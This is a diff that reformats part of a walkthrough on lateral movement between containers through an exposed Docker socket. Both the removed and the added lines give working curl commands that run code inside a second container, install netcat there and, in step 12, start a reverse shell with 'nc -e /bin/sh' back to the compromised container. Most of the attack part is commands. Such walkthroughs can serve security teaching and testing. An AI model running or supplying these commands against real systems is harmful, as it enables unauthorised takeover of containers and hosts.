@@ -82,9 +82,9 @@ So, Container C1 is compromised.
 	
 	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/<ExecID>/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`
 
-**You can also use a single nested command instead of running two commands**
+	**You can also use a single nested command instead of running two commands**
 
-		curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["date"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
+	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["date"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`
 	
 Now we know that we have the ability to run command on another container (C2), we can get the complete shell access of C2 by getting reverse shell, We would need netcat installed on C2 that can send us the reverse shell. We would need netcat on container C1 as well to catch the reverse shell.
 
@@ -94,15 +94,15 @@ Now we know that we have the ability to run command on another container (C2), w
 	
 6. Installing netcat on C2, Not that simple; Use the same curl technique to run command remotely:
 
-		curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","netcat"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
+	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","netcat"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`
 
 7. You can check if netcat has been installed properly
 
-		curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["which","nc"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
+	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["which","nc"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`
 
 8. Similarly, net-tools can be installed, however not needed, just to check the IP address of C2. But we would need the IP address of C1 (to send the reverse shell).
 
-		curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","net-tools"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
+	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["apt","install","-y","net-tools"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`
 
 9. Check IP address of C1:
 
@@ -112,7 +112,7 @@ Now we know that we have the ability to run command on another container (C2), w
 
 10. Check IP address of C2:
 
-		curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["ifconfig"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
+	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["ifconfig"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`
 
 11. Open the shell listener on C1, on which C2 will send the reverse shell.
 
@@ -120,7 +120,7 @@ Now we know that we have the ability to run command on another container (C2), w
 
 12. Now, lets check if we are able to get complete access to C2, Moment of the truth! Run the netcat command from C2 and wait on C1 to recieve the shell.
 	
-		curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["nc","-e","/bin/sh","172.17.0.3", "8080"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'
+	`curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/exec/$(curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/dcd2cca67d187fcbbd7fef316eda4b8d9b21fa06a5f63bba55b82371a8ab408b/exec -H "Content-Type: application/json" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "DetachKeys": "ctrl-p,ctrl-q", "Tty": false, "Cmd": ["nc","-e","/bin/sh","172.17.0.3", "8080"] }' | jq  '.[]' | tr -d '"')/start -H "Content-Type: application/json" -d '{ "Detach": false, "Tty": false }'`
 
 -----
 
